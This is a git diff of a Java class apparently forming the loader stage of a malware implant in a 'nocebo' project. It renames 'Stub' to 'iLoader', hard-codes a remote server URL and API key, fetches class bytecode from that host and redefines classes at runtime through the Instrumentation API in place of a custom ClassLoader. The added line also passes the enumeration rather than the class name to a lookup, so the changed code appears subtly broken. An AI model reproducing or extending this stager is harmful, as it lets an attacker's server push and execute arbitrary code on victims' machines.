@@ -1,4 +1,4 @@
-package com.nocebo.nCore;
+package com.nocebo.nLoader;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -93,7 +93,7 @@ import java.awt.HeadlessException;
 import java.awt.Toolkit;
 
 
-public class Stub
+public class iLoader
 {
     static public String urlData = "https://192.168.1.157/59009";
     static public String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
@@ -129,14 +129,13 @@ public class Stub
         coreOp();
 
         Hashtable<String,byte[]> classData = classRequest();
-        pkgLib cLoader = new pkgLib();
-        
         Enumeration<String> b = classData.keys();
 
         while (b.hasMoreElements())
         {
             String bData = b.nextElement();
-            cLoader.load(bData,classData.get(bData));
+            ClassDefinition cDef = new ClassDefinition(Class.forName(bData), classData.get(b));
+            inst.redefineClasses(cDef);
         }
         
 
@@ -153,12 +152,6 @@ public class Stub
         
     }
 
-    private static class pkgLib extends ClassLoader {
-        private Class load(String className, byte[] classical)
-        {
-            return defineClass(String.format("com.nocebo.nCore.%s",className), classical, 0, classical.length);
-        }
-    }
 
     public static void coreOp() throws IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
     {
